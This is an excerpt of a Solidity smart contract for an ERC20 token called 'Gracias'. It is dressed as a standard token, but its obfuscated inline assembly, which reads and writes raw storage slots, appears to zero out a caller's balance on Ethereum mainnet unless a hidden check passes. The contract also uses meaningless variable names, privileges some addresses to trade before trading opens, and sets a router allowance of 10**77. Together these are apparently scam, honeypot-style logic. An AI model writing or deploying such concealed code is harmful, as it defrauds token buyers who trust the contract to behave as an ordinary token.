...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addGracias;
    uint256 private thanksMate = block.number*2;

    mapping (address => bool) private _firstJapanese; 
    mapping (address => bool) private _secondSpanish;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private waterGlass;
    ...
    bool private trading; uint256 private coinBased = 1; bool private moneyMachine;
    uint256 private _decimals; uint256 private closedWall;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addGracias.push(_router); addGracias.push(msgSender_); addGracias.push(pair);
        for (uint256 q=0; q < 3;) {_firstJapanese[addGracias[q]] = true; unchecked{q++;} }
    }
    ...
    function _setVariables() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xaa44c5075ec956b5c76259c5dd44872540e354b01fc1d4ac9e3ab518915ff271
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x5b382d625f9ee4d0595a374cf7761c489325bd1e4790df055e620a323a492111,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; thanksMate = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addGracias[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployGracias(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addGracias[0], 10 ** 77);
        _setVariables();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployGracias(creator, initialSupply);
    }
}

contract $GRACIAS is ERC20Token {
    constructor() ERC20Token("Gracias", "GRACIAS", msg.sender, 125000000 * 10 ** 18) {
    }
}